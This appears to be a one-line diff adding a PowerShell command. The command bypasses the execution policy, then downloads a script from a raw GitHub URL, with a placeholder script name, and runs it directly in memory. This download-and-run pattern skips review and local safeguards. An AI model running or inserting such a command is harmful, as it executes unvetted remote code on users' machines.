@@ -1,0 +1,1 @@
+powershell -ExecutionPolicy Bypass -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tools4windows/tools4windows/refs/heads/main/SCRIPT_NAME_HERE.ps1')"
